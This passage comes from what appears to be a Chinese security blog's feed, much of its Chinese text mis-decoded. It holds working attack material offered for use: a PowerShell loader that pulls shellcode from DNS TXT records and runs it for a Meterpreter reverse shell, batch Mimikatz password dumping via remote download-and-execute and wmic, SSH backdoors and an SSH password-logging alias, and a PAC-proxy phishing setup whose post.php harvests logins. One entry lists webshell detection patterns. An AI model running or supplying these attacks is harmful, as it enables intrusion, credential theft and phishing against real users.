LHOST x.x.x.xLHOST =&gt; x.x.x.xmsf exploit(handler) &gt; exploit[*] Started reverse handler on x.x.x.x:8887[*] Starting the payload handler... æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªè·å–TXTè®°å½•å¹¶æ‰§è¡Œçš„è„šæœ¬ï¼Œè¿™é‡Œæˆ‘æ”¹äº†ä¸€ä¸ªè„šæœ¬ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182function Execute-Code&#123;&lt;#.PARAMETER ShelldomainThe domain (or subdomain) whose subbdomain's TXT records would hold shellcode..PARAMETER subdomainsThe number of subdomains which would be used to provide shellcode from their TXT records. .PARAMETER AUTHNSAuthoritative Name Server for the domains..EXAMPLEPS &gt; Execute-CodeThe payload will ask for all required options..EXAMPLEPS &gt; Execute-Code -Shelldomain 32.alteredsecurity.com -SubDomains 5 -AUTHNS f1g1ns2.dnspod.net.Use above from non-interactive shell.#&gt; [CmdletBinding()] Param( [Parameter(Position = 0, Mandatory = $True)] [String] $Shelldomain, [Parameter(Position = 1, Mandatory = $True)] [String] $Subdomains, [Parameter(Position = 2, Mandatory = $True)] [String] $AUTHNS ) function Get-ShellCode &#123; Param( [Parameter()] [String] $Shelldomain ) $i = 1 while ($i -le $subdomains) &#123; $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$Shelldomain $AUTHNS") $temp = $getcommand | select-string -pattern "`"" $tmp1 = "" $tmp1 = $tmp1 + $temp $encdata = $encdata + $tmp1 -replace '\s+', "" -replace "`"", "" $i++ &#125; #$encdata = "" $dec = [System.Convert]::FromBase64String($encdata) $ms = New-Object System.IO.MemoryStream $ms.Write($dec, 0, $dec.Length) $ms.Seek(0,0) | Out-Null $cs = New-Object System.IO.Compression.DeflateStream ($ms, [System.IO.Compression.CompressionMode]::Decompress) $sr = New-Object System.IO.StreamReader($cs) $sc = $sr.readtoend() return $sc &#125; $Shell = (Get-ShellCode $Shelldomain) #Remove unrequired things from msf shellcode $tmp = $Shell -replace "`n","" -replace '\$buf \+\= ',"," -replace '\[Byte\[\]\] \$buf \=' -replace " " [Byte[]]$sc = $tmp -split ',' #Code Execution logic $code = @" [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); [DllImport("msvcrt.dll")] public static extern IntPtr memset(IntPtr dest, uint src, uint count);"@ $winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru $size = 0x1000 if ($sc.Length -gt 0x1000) &#123;$size = $sc.Length&#125; $x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40) for ($i=0;$i -le ($sc.Length-1);$i++) &#123;$winFunc::memset([IntPtr]($x.ToInt64()+$i), $sc[$i], 1)&#125; Try &#123; $winFunc::CreateThread(0,0,$x,0,0,0) sleep 100000 &#125; Catch &#123; [system.exception] "caught a system exception" &#125;&#125; å‚æ•°è¯´æ˜ï¼ŒShelldomainä¸ºåˆ›å»ºtxtè®°å½•çš„åŸŸåæˆ–å­åŸŸå;subdomainsä¸ºåˆ›å»ºTXTåŸŸåçš„ä¸ªæ•°ï¼Œå¦‚ä¸Šé¢æ‰€åˆ›å»ºçš„ä¸º3;AUTHNSä¸ºåŸŸçš„æƒå¨åç§°æœåŠ¡å™¨ï¼Œå¦‚æˆ‘ä½¿ç”¨çš„ç‹—çˆ¹ï¼Œæ‰€ä»¥AUTHNSä¸ºf1g1ns2.dnspod.net åœ¨32ä½win7ä¸Šæ‰§è¡Œï¼š12PS C:\Users\evi1cg\Desktop&gt; . .\Execute-Code.ps1PS C:\Users\evi1cg\Desktop&gt; Execute-Code -Shelldomain 32.evi1cg.me -subdomains 3 -AUTHNS f1g1ns2.dnspod.net æˆåŠŸè·å–meterpreterä¼šè¯ï¼š 64ä½çš„è¯·è‡ªè¡Œä¿®æ”¹payloadåŠè„šæœ¬ã€‚ 0x04 è¡¥å…… Metasploitä¸­å·²ç»å«æœ‰æ­¤è„šæœ¬dns_txt_query_exec.rbï¼Œæ­¤è„šæœ¬æŸ¥è¯¢TXTè®°å½•çš„é¡ºåºä¸ºa.domain,b.domainâ€¦,ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œé¦–å…ˆç”Ÿæˆpayload:1â˜ ~ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=103.238.225.222 LPORT=8887 -e x86/alpha_mixed Bufferregister=EDI -f raw &gt; reverse.txt ä½¿ç”¨ä¸‹é¢çš„è„šæœ¬å¯¹è¯¥æ–‡ä»¶è¿›è¡Œåˆ‡å‰²ï¼š123456789#!/usr/bin/env python#coding=utf-8def txt(string,length): return [string[x:x+length] for x in range(0,len(string),length)]with open('out.txt','w+') as f: line = open('reverse.txt','r').read() line= txt(line,255) for txts in line: f.writelines(txts+'\n\n\n\n') è¾“å‡ºå¦‚ä¸‹ï¼š å°†è¿™ä¸‰è¡Œåˆ†åˆ«æ·»åŠ åˆ°a.domain,b.domain,c.domainçš„TXTè®°å½•ä¸­: ç”Ÿæˆexe:1â˜ ~ sudo msfvenom -p windows/dns_txt_query_exec DNSZONE=evi1cg.me -f exe &gt; test.exe msfå¼€å¯ç›‘å¬ï¼š12345678msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set LHOST x.x.x.xLHOST =&gt; x.x.x.xmsf exploit(handler) &gt; set LPORT 8887LPORT =&gt; 8887msf exploit(handler) &gt; exploit è¿è¡Œexeï¼Œè·å¾—meterpreter: è‡³äºå…æ€ï¼Œå¯ä»¥ç›´æ¥ç”Ÿæˆcæ ¼å¼çš„shellcode,ç„¶åæŒ‰ç…§æ‰“é€ å…æ€payloadæ¥åšã€‚ 0x05 å°ç»“ æœ¬æ–‡ä¸»è¦ä»‹ç»ä¸€ç§æ‰§è¡Œå‘½ä»¤çš„æ–¹å¼ä»¥åŠnishangçš„è„šæœ¬ä½¿ç”¨ï¼Œå¸Œæœ›èƒ½å¯¹å¤§å®¶æœ‰å¸®åŠ©ã€‚]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
        <tag>metasploit</tag>
        <tag>dns</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tips]]></title>
    <url>%2Farchives%2Ftips.html</url>
    <content type="text"><![CDATA[&lt;?php if (md5(&apos;240610708&apos;) == &quot;0&quot;) { echo &quot;Matches&quot;; } ?&gt;]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>alctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨Invoke-Mimikatz.ps1æ‰¹é‡è·å–windowså¯†ç ]]></title>
    <url>%2Farchives%2FGet_Passwords_with_Invoke-Mimikatz.html</url>
    <content type="text"><![CDATA[é€šå¸¸å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼è·å–ç™»é™†windowsçš„å¯†ç ï¼š1powershell "IEX (New-Object Net.WebClient).DownloadString('http://dwz.cn/1OropX'); Invoke-Mimikatz -DumpCreds" é€šå¸¸åœ¨åŸŸæ¸—é€çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯èƒ½æƒ³è¦è·å¾—æ›´å¤šçš„å¯†ç ï¼Œé’ˆå¯¹server08ä»¥åçš„æœåŠ¡å™¨è·å–ntds.ditçš„hashä»¥åè¿˜ä¸ä¸€å®šèƒ½ç ´è§£å‡ºæ¥,æ‰€ä»¥å¯ä»¥é€šè¿‡Mimikatzæ¥è·å–æ˜æ–‡å¯†ç ï¼Œä½†æ˜¯ä¸€å°ä¸€å°ç™»é™†å»è·å–ä¼šå¾ˆæ…¢ä¸”ä¸æ–¹ä¾¿ï¼Œæ‰€ä»¥è¿™é‡Œä»‹ç»ä¸€ä¸ªæ‰¹é‡çš„æ–¹æ³•ï¼š 1.åˆ›å»ºå…±äº«æ–‡ä»¶å¤¹ï¼š1234cd\mkdir opennet share open=C:\open /grant:everyone,fullicacls C:\open\ /grant Everyone:(OI)(CI)F /t ä¿®æ”¹æ³¨å†Œè¡¨12reg change HKLM\System\CurrentControlSet\services\LanmanServer\Parameters NullSessionShares REG_MULTI_SZ openreg change HKLM\System\CurrentControlSet\Control\Lsa "EveryoneIncludesAnonymous" 1 ä¿®æ”¹å…±äº«ç›®å½•åˆ°openã€‚ 2.åœ¨å…±äº«ç›®å½•æ·»åŠ ä¸‹åˆ—æ–‡ä»¶ï¼š 1ï¼‰æ‰§è¡Œè„šæœ¬powershellme.cmdï¼Œè„šæœ¬å†…å®¹ï¼š 12powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.11:8080/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds &gt; \\192.168.1.11\open\%COMPUTERNAME%.txt 2&gt;&amp;1ipæ˜¯è®¾ç½®å…±äº«çš„ä¸»æœºipåœ°å€ã€‚ 2ï¼‰Invoke-Mimikatz.ps1 3ï¼‰mongoose 4ï¼‰æœåŠ¡å™¨åˆ—è¡¨serverlist.txtï¼Œæ¢è¡Œåˆ†å‰²ã€‚ 3.è¿è¡Œmongooseï¼Œé»˜è®¤å¼€å¯ç«¯å£8080 4.æ‰§è¡Œwmicï¼š1wmic /node:@serverlist.txt process call create "\\192.168.1.11\open\powershellme.cmd" å¸¦å‡­è¯ï¼š1wmic /node:@serverlist.txt /user:PROJECTMENTOR\evi1cg /password:123 process call create "\\192.168.1.11\open\powershellme.cmd" 5.åœ¨å…±äº«ç›®å½•çœ‹å„ä¸ªæœåŠ¡å™¨çš„å¯†ç å§ã€‚ 6.æ¸…é™¤è®°å½•ï¼š 1ï¼‰å…³æ‰mongoose,å¹¶åˆ é™¤ 2ï¼‰net share open /delete 3ï¼‰åˆ é™¤å…±äº«ç›®å½•åŠæ–‡ä»¶ 4ï¼‰ä¿®æ”¹æ³¨å†Œè¡¨ PS:å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¼€å¯PowerShell remotingï¼š1psexec @serverlist.txt -u [admin account name] -p [admin account password] -h -d powershell.exe "enable-psremoting -force"]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>mimikatz</tag>
        <tag>å¯†ç </tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åˆ«åŠ¨æˆ‘çš„shell]]></title>
    <url>%2Farchives%2FDon-t_touch_my_shell.html</url>
    <content type="text"><![CDATA[åˆ«åŠ¨æˆ‘çš„shellMSF é€šè¿‡ACLéšè—Bind Shell1root@kali:~# msfvenom -p windows/shell_hidden_bind_tcp LPORT=8889 AHOST=192.168.52.129 -f exe &gt; hidden_shell.exe AHOST å°±æ˜¯æ”»å‡»è€…çš„IPï¼š å°†exeä¸Šä¼ è‡³å—å®³è€…PCå¹¶è¿è¡Œï¼š è¿™é‡Œç«¯å£å·²ç»å¼€äº†ã€‚ åœ¨åŒæ®µä¸‹å…¶ä»–æœºå™¨è¿æ¥è¯¥ç«¯å£ï¼š æ”»å‡»è€…è¿æ¥ï¼š]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[powerpreter]]></title>
    <url>%2Farchives%2Fpowerpreter.html</url>
    <content type="text"><![CDATA[powerpreterä¸‹è½½ï¼š1PS F:\powerpreter&gt; (new-object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/samratashok/nishang/master/powerpreter/Powerpreter.psm1","powerpreter.psm1") åŠ è½½ï¼š1PS F:\powerpreter&gt; Import-Module .\powerpreter.psm1 åˆ—å‡ºå¯¼å…¥çš„æ¨¡å—ä¸­çš„æ–¹æ³•ï¼š1PS F:\powerpreter&gt; Get-Command -Module powerpreter æŸ¥çœ‹æ¨¡å—å¸®åŠ©ä¿¡æ¯1help Check-VM -full]]></content>
      <categories>
        <category>å·¥å…·æ”¶é›†</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LinuxæŸ¥webshell]]></title>
    <url>%2Farchives%2FWebshell_find.html</url>
    <content type="text"><![CDATA[åœ¨ç½‘ç«™ç›®å½•å·®æ‰¾å¦‚ä¸‹å…³é”®å­—ï¼š123456789101112131415grep -Rn "shell_exec *(" /var/wwwgrep -Rn "base64_decode *(" /var/wwwgrep -Rn "phpinfo *(" /var/wwwgrep -Rn "system *(" /var/wwwgrep -Rn "php_uname *(" /var/wwwgrep -Rn "chmod *(" /var/wwwgrep -Rn "fopen *(" /var/wwwgrep -Rn "fclose *(" /var/wwwgrep -Rn "readfile *(" /var/wwwgrep -Rn "edoced_46esab *(" /var/wwwgrep -Rn "eval *(" /var/wwwgrep -Rn "pwd" /var/wwwgrep -Rn "pass" /var/wwwgrep -Rn "pw" /var/wwwgrep -Rn å¯†ç " /var/www find:1find /www/ -name "*.php" |xargs egrep 'assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval \(str_rot13|\.chr\(|\$\&#123;\"\_P|eval\(\$\_R|file_put_contents\(\.\*\$\_|base64_decode']]></content>
      <categories>
        <category>è¿ç»´</category>
      </categories>
      <tags>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ¸—é€è¿‡ç¨‹ä¸­çš„SSH]]></title>
    <url>%2Farchives%2FPentest_SSH.html</url>
    <content type="text"><![CDATA[1.å…¥ä¾µå¾—åˆ°SHELLåï¼Œå¯¹æ–¹é˜²ç«å¢™æ²¡é™åˆ¶ï¼Œæƒ³å¿«é€Ÿå¼€æ”¾ä¸€ä¸ªå¯ä»¥è®¿é—®çš„SSHç«¯å£è‚‰é¸¡ä¸Šæ‰§è¡Œ1ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337; å°±ä¼šæ´¾ç”Ÿä¸€ä¸ª31337ç«¯å£ï¼Œç„¶åè¿æ¥31337ï¼Œç”¨root/bin/ftp/mailå½“ç”¨æˆ·åï¼Œå¯†ç éšæ„ï¼Œå°±å¯ç™»é™†ã€‚ 2.åšä¸€ä¸ªSSH wrapperåé—¨ï¼Œæ•ˆæœæ¯”ç¬¬ä¸€ä¸ªå¥½ï¼Œæ²¡æœ‰å¼€æ”¾é¢å¤–çš„ç«¯å£ï¼Œåªè¦å¯¹æ–¹å¼€äº†SSHæœåŠ¡ï¼Œå°±èƒ½è¿œç¨‹è¿æ¥åœ¨è‚‰é¸¡ä¸Šæ‰§è¡Œï¼š1234567[root@localhost ~]# cd /usr/sbin[root@localhost sbin]# mv sshd ../bin[root@localhost sbin]# echo '#!/usr/bin/perl' &gt;sshd[root@localhost sbin]# echo 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' &gt;&gt;sshd[root@localhost sbin]# echo 'exec &#123;"/usr/bin/sshd"&#125; "/usr/sbin/sshd",@ARGV,' &gt;&gt;sshd[root@localhost sbin]# chmod u+x sshd[root@localhost sbin]# /etc/init.d/sshd restart åœ¨æœ¬æœºæ‰§è¡Œï¼š1socat STDIO TCP4:10.18.180.20:22,sourceport=13377 å¦‚æœä½ æƒ³ä¿®æ”¹æºç«¯å£ï¼Œå¯ä»¥ç”¨pythonçš„structæ ‡å‡†åº“å®ç°1234567&gt;&gt;&gt; import struct&gt;&gt;&gt; buffer = struct.pack('&gt;I6',19526)&gt;&gt;&gt; print repr(buffer)'\x00\x00LF'&gt;&gt;&gt; buffer = struct.pack('&gt;I6',13377)&gt;&gt;&gt; print buffer4A 3. è®°å½•SSHå®¢æˆ·ç«¯è¿æ¥å¯†ç æå®šä¸»æœºåï¼Œå¾€å¾€æƒ³è®°å½•è‚‰é¸¡SSHè¿æ¥åˆ°å…¶ä»–ä¸»æœºçš„å¯†ç ï¼Œè¿›ä¸€æ­¥æ‰©å¤§æˆ˜æœï¼Œä½¿ç”¨straceå‘½ä»¤å°±è¡Œäº†ã€‚åœ¨è‚‰é¸¡ä¸Šä¿®æ”¹è¦è®°å½•å¯†ç ç”¨æˆ·ç›®å½•çš„.bashrcï¼Œæ·»åŠ ä¸€è¡Œ:1alias ssh='strace -o /tmp/.sshpwd-`date '+%d%h%m%s'`.log -e read.write.connect -s 2048 ssh' ä¹‹åæŸ¥çœ‹tmpç›®å½•çš„è®°å½•ï¼š1grep "read(5" /tmp/.sshpwdxxxxxxxx.log]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é€šè¿‡.PACè¿›è¡Œç½‘ç»œé’“é±¼]]></title>
    <url>%2Farchives%2Fphish_use_pac.html</url>
    <content type="text"><![CDATA[0x00å¸¸è§ç½‘ç»œé’“é±¼æ–¹å¼ æ”»å‡»è€…è¿›è¡Œç½‘ç»œé’“é±¼çš„æ–¹å¼å¸¸æœ‰ä»¥ä¸‹å‡ ç§: 1ã€é€šè¿‡ä¿®æ”¹å—å®³è€…hostsæ–‡ä»¶(C:\WINDOWS\system32\drivers\etc\hosts)æ¥å®ç°ï¼› 2ã€é€šè¿‡ä¿®æ”¹å—å®³è€…dnsæ¥å®ç°ï¼› 3ã€å·²ç»è¿›å…¥è·¯ç”±å™¨ï¼Œç›´æ¥ä¿®æ”¹è·¯ç”±å™¨çš„DNSã€‚ ç½—åˆ—çš„å¹¶ä¸å…¨ï¼Œä¹‹åé‡åˆ°çš„è¯å†è¡¥å……ï¼Œä¸Šè¿°ä¸‰ç§æ–¹å¼å¾ˆå¸¸è§ã€‚ 1: ä¿®æ”¹HOSTSæ–‡ä»¶ï¼Œå³æ”»å‡»è€…ä¿®æ”¹å—å®³è€…HOSTSæ–‡ä»¶ä¸ºå¦‚ä¸‹å½¢å¼ï¼š 127.0.0.1 localhostx.x.x.x www.wooyun.com è¿™æ ·å°±å—å®³è€…è®¿é—®www.wooyun.comä¼šç›´æ¥è®¿é—®åˆ°x.x.x.xã€‚åœ¨msfä¸­å¯ä»¥ä½¿ç”¨[inject_host](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/manage/inject_host.rb)è„šæœ¬æ¥å®ç°ã€‚ 2ï¼šä¿®æ”¹dnsè¿›è¡Œæ”»å‡»ï¼šæ”»å‡»è€…å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ä¿®æ”¹å—å®³è€…çš„dnsåœ°å€(ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œ)ï¼š 12345678910C:\Windows\system32&gt;netsh interface ip show interfacesIdx Met MTU çŠ¶æ€ åç§°--- --- ----- ----------- ------------------- 1 50 4294967295 connected Loopback Pseudo-Interface 1 10 10 1500 connected æœ¬åœ°è¿æ¥C:\Windows\system32&gt;netsh interface ip set dns "æœ¬åœ°è¿æ¥" static 192.168.1.100C:\Windows\system32&gt;ipconfig /all | findstr 192.168.1.100 DNS æœåŠ¡å™¨ . . . . . . . . . . . : 192.168.1.100 è¿™æ ·å°±ä¿®æ”¹äº†å—å®³è€…çš„DNSåœ°å€ï¼Œä¹‹åå¯ä»¥ä½¿ç”¨msfçš„ fakednsæ¥æ¶è®¾dnsæœåŠ¡å™¨æ¥ä¿®æ”¹åŸŸåçš„è§£æåœ°å€ã€‚ é™¤äº†ç›´æ¥ä¿®æ”¹è·¯ç”±å™¨çš„DNSåœ°å€çš„ä»¥ä¸Šä¸¤ç§æ–¹å¼åœ¨æŸäº›ç¯å¢ƒä¸‹è¿˜æ˜¯æœ‰ä¸€äº›ç¼ºç‚¹çš„ï¼Œä¾‹å¦‚ï¼Œä¸€äº›ç‰›é€¼çš„AVä¼šæ£€æµ‹åˆ°æ–‡ä»¶çš„ä¿®æ”¹è€Œå‘å‡ºæŠ¥è­¦ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œå¦‚æœå—å®³è€…æ‰€å¤„å†…ç½‘ç¯å¢ƒä¸­çš„é˜²ç«å¢™æˆ–è·¯ç”±å™¨æ‹¦æˆªå¯¹å¤–éƒ¨çš„DNSè¯·æ±‚ï¼Œä¿®æ”¹å—å®³è€…DNSçš„æ”»å‡»æ–¹å¼å¹¶ä¸èƒ½ç”Ÿæ•ˆï¼ˆå› ä¸ºæ”»å‡»è€…æ¶è®¾çš„DNSåœ¨å¤–ç½‘ç¯å¢ƒä¸‹ï¼‰ã€‚ 0x01é€šè¿‡PACä»£ç† æœ¬æ–‡ä¸»è¦ä»‹ç»çš„æ˜¯Metasploitä¸­çš„ä¸€ä¸ªæ¨¡å—ie_proxypacã€‚é€šè¿‡.PAC(è‡ªåŠ¨é…ç½®ä»£ç†)æ–‡ä»¶æ¥å®Œå…¨æ§åˆ¶IEçš„ç”¨æˆ·æµé‡ã€‚åªéœ€è¦ä¿®æ”¹PACæ–‡ä»¶ï¼Œæ”»å‡»è€…å°±èƒ½ä½¿å—å®³è€…è®¿é—®çš„æŸä¸ªåŸŸåæŒ‡å‘æ”»å‡»è€…çš„IPã€‚è™½ç„¶æ²¡æœ‰ä¿®æ”¹DNSä½†æ˜¯å¯ä»¥è¾¾åˆ°åŒæ ·çš„æ•ˆæœï¼Œä¸”è¿™ç§æ–¹å¼è¾ƒä¸ºéšè”½ã€‚å·²ç»æœ‰å¾ˆå¤šäººä½¿ç”¨è¿™ç§æ–¹å¼è¿›è¡Œç½‘ç»œé’“é±¼ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªPACæ–‡ä»¶ç¤ºä¾‹ï¼š123456789function FindProxyForURL(url, host)&#123;if (shExpMatch(host, "www.wooyun.org")) &#123; return "PROXY 192.168.52.129:80; DIRECT";&#125;if (shExpMatch(host, "www.baidu.com")) &#123; return "PROXY 192.168.52.129:80; DIRECT";&#125;&#125; è¿™ä¸ªæ–‡ä»¶çš„é…ç½®æ˜¯å½“å—å®³è€…è®¿é—®www.wooyun.comä»¥åŠwww.baidu.comæ—¶ï¼Œä»–ä¼šç›´æ¥è¯·æ±‚åˆ°æ”»å‡»è€…ipï¼ˆ 192.168.52.129ï¼‰ã€‚ è¯¦ç»†çš„PACç¼–.På†™è¯·æŸ¥çœ‹http://findproxyforurl.com/pac-functions/ã€‚ å°†ä»¥ä¸Šè„šæœ¬ä¿å­˜ä¸ºtest.pacï¼Œåœ¨è·å–meterpreterä¼šè¯çš„åŸºç¡€ä¸Šä½¿ç”¨ie_proxypacè„šæœ¬:1234567891011121314151617181920212223meterpreter &gt; background [*] Backgrounding session 1...msf &gt; use post/windows/manage/ie_proxypac msf post(ie_proxypac) &gt; set session 1session =&gt; 1msf post(ie_proxypac) &gt; set REMOTE_PAC http://192.168.52.129/test.pacREMOTE_PAC =&gt; http://192.168.52.129/test.pacmsf post(ie_proxypac) &gt; show options Module options (post/windows/manage/ie_proxypac): Name Current Setting Required Description ---- --------------- -------- ----------- AUTO_DETECT false yes Automatically detect settings. DISABLE_PROXY false yes Disable the proxy server. LOCAL_PAC no Local PAC file. REMOTE_PAC http://192.168.52.129/test.pac no Remote PAC file. (Ex: http://192.168.1.20/proxy.pac) SESSION 1 yes The session to run this module on.msf post(ie_proxypac) &gt; exploit [*] Setting automatic configuration script from local PAC file ...[+] Automatic configuration script configured...[*] Post module execution completed ä¹‹åæ‰“å¼€ieï¼Œinterneté€‰é¡¹-&gt;è¿æ¥-&gt;å±€åŸŸç½‘è®¾ç½®ï¼š å¯ä»¥çœ‹åˆ°pacå·²ç»ä½¿ç”¨pacæ–‡ä»¶è¿›è¡Œäº†ä»£ç†ã€‚ ä»£ç†å°½é‡ä½¿ç”¨è¿œç¨‹ä»£ç†ï¼Œå› ä¸ºIE11é»˜è®¤ç¦æ­¢æœ¬åœ°ä»£ç†ï¼Œå¦‚æœä½¿ç”¨æœ¬åœ°ä»£ç†ï¼Œä»£ç†æ˜¯æ— æ•ˆçš„ã€‚è¯¦æƒ…æµ‹è¯•å‘ç°ï¼Œå¦‚æœè¿æ¥äº†vpnï¼Œpacä»£ç†æ˜¯å¤±æ•ˆçš„ã€‚ ç°åœ¨å†è®¿é—®www.baidu.com,www.wooyun.orgï¼Œä¼šçœ‹åˆ°å·²ç»è½¬ç§»åˆ°äº†æˆ‘ä»¬åˆ¶å®šçš„ipï¼š 0x02èƒ½åšä»€ä¹ˆ è¿™é‡Œæˆ‘ä»¬ä¿®æ”¹pacæ–‡ä»¶å¦‚ä¸‹ï¼š123456function FindProxyForURL(url, host)&#123;if (shExpMatch(host, "www.wooyun.org")) &#123; return "PROXY 192.168.52.129:80; DIRECT";&#125;&#125; è¿™é‡Œipè¦æ”¹æˆè‡ªå·±çš„webçš„ipï¼Œå¦‚æœå—å®³è€…è¯·æ±‚çš„ç½‘ç«™hostä¸º www.wooyun.org æ—¶ï¼Œæ»¡è¶³è§„åˆ™ï¼Œç„¶åè·³è½¬åˆ°æˆ‘ä»¬æŒ‡å®šçš„ipåœ°å€ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥æ¥æ„é€ é’“é±¼ã€‚æ‰“å¼€wooyun,å³é”®æŸ¥çœ‹æºä»£ç ï¼Œå°†æ‰€æœ‰æºä»£ç ä¿å­˜ä¸ºindex.htmlï¼Œæ”¾åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹ï¼Œå› ä¸ºå½“å—å®³è€…è¯·æ±‚ http://wooyun.orgï¼Œå…¶hostä¸º wooyun.org ä¸æ»¡è¶³ä»£ç†æ¡ä»¶ï¼Œå°±ä¼šç›´æ¥è¯·æ±‚ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠæºä»£ç ä¸­çš„www.wooyun.orgï¼Œæ”¹ä¸ºwooyun.org: ç„¶åæ‰¾åˆ°urlï¼Œsrcï¼Œhrefæ ‡ç­¾ï¼Œä¿®æ”¹ä¸ºhttp://wooyun.org/xxxx çš„å½¢å¼ï¼Œæ¯”å¦‚1&lt;link href="/css/style.css?v=201501291909" rel="stylesheet" type="text/css"/&gt; ä¿®æ”¹ä¸º1&lt;link href="http://wooyun.org/css/style.css?v=201501291909" rel="stylesheet" type="text/css"/&gt; æ”¹å®Œä»¥åï¼ŒåŸºæœ¬ä¸Šå°±ç®—å…‹éš†æˆåŠŸäº†ï¼š ä¸‹æ¥è¦æŠŠç™»é™†é¡µé¢çš„çš„æºç å¤åˆ¶è¿‡æ¥ï¼Œæ‰“å¼€http://www.wooyun.org/user.php?action=loginï¼Œå³é”®å¤åˆ¶æºç ï¼Œä¿å­˜ä¸ºuser.phpï¼Œæ”¾åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹ï¼Œä¿®æ”¹æºç ä¸­çš„urlï¼Œsrcï¼Œhrefã€‚ä¿®æ”¹å®Œä¹‹åï¼Œæ‰“å¼€index.htmlæ–‡ä»¶ï¼Œå®šä½`ç™»å½•`ï¼Œä¿®æ”¹hrefä¸º user.php?action=loginï¼Œä¿®æ”¹ä»¥åæ­¤æ ‡ç­¾ä¸ºï¼š1&lt;a href="user.php?action=login"&gt;ç™»å½•&lt;/a&gt; | &lt;a href="http://wooyun.org/user.php?action=register" class="reg"&gt;æ³¨å†Œ&lt;/a&gt; æ‰“å¼€user.php,å®šä½ç”¨æˆ·ç™»å½•è¡¨å•ï¼Œä¿®æ”¹è¡¨å•actionä¸ºpost.php:1234&lt;a href="#"&gt;ç”¨æˆ·ç™»å½•&lt;/a&gt;&lt;/div&gt; &lt;/div&gt;&lt;form action="post.php" method="POST"&gt; ..... åœ¨ç½‘ç«™æ ¹ç›®å½•æ–°å»ºpost.phpï¼Œæ·»åŠ å¦‚ä¸‹ä»£ç ï¼š1&lt;?php $file = 'data.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?&gt;&lt;meta http-equiv="refresh" content="0; url=http://wooyun.org/user.php?action=login" /&gt; è¿™æ ·é’“é±¼ç«™å°±æ­å»ºå¥½äº†ã€‚å½“ç”¨æˆ·ç™»å½•æ—¶ï¼š ç‚¹å‡»ç™»é™†ä»¥åä¼šè·³è½¬åˆ°http://wooyun.org/user.php?action=login æŸ¥çœ‹data.txt: åªæ˜¯ç®€å•åœ°ä¸€ä¸ªç¤ºä¾‹ï¼Œå…·ä½“å¯ä»¥é€šè¿‡ä¿®æ”¹pacæ–‡ä»¶æ¥å®ç°æ§åˆ¶æµè§ˆå™¨æ˜¯å¦è¿›è¡Œä»£ç†ã€‚ 0x03 å°ç»“æ­¤ç§æ–¹å¼è¿›è¡Œç½‘ç»œé’“é±¼ï¼Œåšçš„ç»†è‡´çš„è¯ï¼Œå¾ˆéš¾è¢«å‘ç°ï¼Œè€Œä¸”éšè”½æ€§å¥½ï¼Œç¼ºç‚¹å°±æ˜¯è¿æ¥vpnä»¥åä»£ç†å°†ä¼šå¤±æ•ˆã€‚ä»¥ä¸Šæ˜¯ä¸ªäººçš„æµ‹è¯•ç»“æœï¼Œè¯·å„ä½å¤§ç‰›æŒ‡æ­£ã€‚]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>ç½‘ç»œé’“é±¼</tag>
        <tag>pac</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Powershell Gethash]]></title>
    <url>%2Farchives%2FPowershell_Gethash.html</url>
